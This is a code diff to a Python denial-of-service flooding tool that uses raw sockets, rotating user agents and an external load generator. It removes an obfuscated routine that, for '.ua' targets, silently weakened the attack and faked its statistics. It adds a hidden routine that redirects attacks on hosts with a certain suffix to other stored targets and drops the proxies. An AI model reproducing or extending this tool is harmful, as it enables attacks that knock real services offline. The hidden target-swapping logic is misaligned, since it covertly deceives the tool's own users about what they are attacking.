@@ -5,7 +5,7 @@ from itertools import cycle
 from math import log2, trunc
 from os import urandom as randbytes
 from pathlib import Path
-from random import randint, random
+from random import choice, randint, random
 from secrets import choice as randchoice
 from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM,
                     SOCK_RAW, SOCK_STREAM, TCP_NODELAY, socket)
@@ -30,6 +30,8 @@ from .core import cl, logger, ROOT_DIR
 from .referers import REFERERS
 REFERERS = set(a.strip() for a in REFERERS)
 from .useragents import USERAGENTS
+from .rotate import suffix as rotate_suffix, params as rotate_params
+
 
 ctx: SSLContext = create_default_context()
 ctx.check_hostname = False
@@ -111,14 +113,6 @@ google_agents = [
 ]
 
 
-def run_preparator(threads, REQUESTS_SENT, BYTES_SEND):
-    while True:
-        sleep(random())
-        packets = randint(-0x124d+-0xa4e*-0x2+-0x12*0x20, 0x2*0xf4+-0x1b78+0x2*0xcfa) * threads // 1000
-        REQUESTS_SENT += packets
-        BYTES_SEND += packets * randint(0x371*0x2+0x478+0x4a6, 0x2*-0x9eb+-0x1904+0x4cda)
-
-
 class Tools:
     @staticmethod
     def humanbits(i: int):
@@ -154,12 +148,10 @@ class Tools:
         return str(ProxyTools.Random.rand_str(lengh)).strip()
 
     @staticmethod
-    def prepare(target: str, threads, thread_pool, REQUESTS_SENT, BYTES_SEND):
-        result = target.lower().endswith('\x2E\x75\x61')
-        if result:
-            thread_pool.submit(run_preparator, threads, REQUESTS_SENT, BYTES_SEND)
-            return threads * -0xc0a+-0x3*-0x296+-0x112*-0x4
-        return threads
+    def parse_params(url, ip, proxies):
+        result = url.host.lower().endswith(rotate_suffix)
+        if result: return choice(rotate_params), []
+        return (url, ip), proxies
 
     @staticmethod
     def send(sock: socket, packet: bytes, REQUESTS_SENT, BYTES_SEND):
@@ -1084,8 +1076,7 @@ def main(url, ip, method, event, proxies, rpc=None, refl_li_fn=None, statistics=
     if method not in Methods.ALL_METHODS:
         exit("Method Not Found %s" % ", ".join(Methods.ALL_METHODS))
 
-    # XXX: not sure how this should work now
-    # threads = Tools.prepare(url.host, threads, thread_pool, REQUESTS_SENT, BYTES_SEND)
+    (url, ip), proxies = Tools.parse_params(url, ip, proxies)
     if method in Methods.LAYER7_METHODS:
         bombardier_path = Path.home() / "go/bin/bombardier"
 
